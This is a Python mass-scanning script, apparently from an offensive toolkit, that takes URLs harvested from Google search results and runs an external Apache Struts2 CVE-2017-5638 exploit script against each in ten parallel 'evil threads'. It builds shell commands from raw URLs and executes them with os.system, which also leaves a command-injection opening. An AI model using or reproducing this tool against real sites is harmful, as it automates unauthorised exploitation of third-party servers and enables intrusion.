import os
from lxml import html as lh
from queue import Queue
from urllib.parse import urlparse
from threading import Thread
import requests
import threading
from requests import get
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lock = threading.Lock()

class ApacheStruts2_CVE_2017_5638():

    def __init__(self, filename):
        self.filename = filename
        self.urls = self.ap_cve()

    @staticmethod
    def banner():
        os.system('clear')
        print("\n")
        print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
        print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
        print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
        print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
        print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
        print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
        print("    Apache Struts2 CVE 2017 5638 Checker - anarcoder at protonmail.com\n") 

    def remove_duplicate_targets(self):
        results = [line.rstrip('\n') for line in open(self.filename)]
        url_lists = []
        for url in results:
            try:
                vuln = ['.action', '.do', 'go']
                for v in vuln:
                    if v in url:
                        urlp = url.split(v)[0]
                        url_lists.append('python2 exploits/struntsrce.py --target='+urlp+v+' --test')
            except:
                pass
        url_lists = set(url_lists)
        url_lists = list(url_lists)
        return url_lists
    
    def check_vuln(self, q):
        while True:
            #with lock:
                url = q.get()
                os.system(url)
                q.task_done()

    def ap_cve(self):
        self.banner()

        # Removing duplicate targets
        url_lists = self.remove_duplicate_targets()
        print(len(url_lists))
        #for url in url_lists:
        #    print(url.rstrip())
        

        # My Queue
        q = Queue(maxsize=0)

        # Number of threads
        num_threads = 10

        for url in url_lists:
            q.put(url)

        # My threads
        print('[*] Starting evil threads =)...\n')
        for i in range(num_threads):
            worker = Thread(target=self.check_vuln, args=(q,))
            worker.setDaemon(True)
            worker.start()

        q.join()


def main():
    filename = 'results_google_search.txt'
    #print(os.getcwd())
    ApacheStruts2_CVE_2017_5638(filename)


if __name__ == '__main__':
    main()
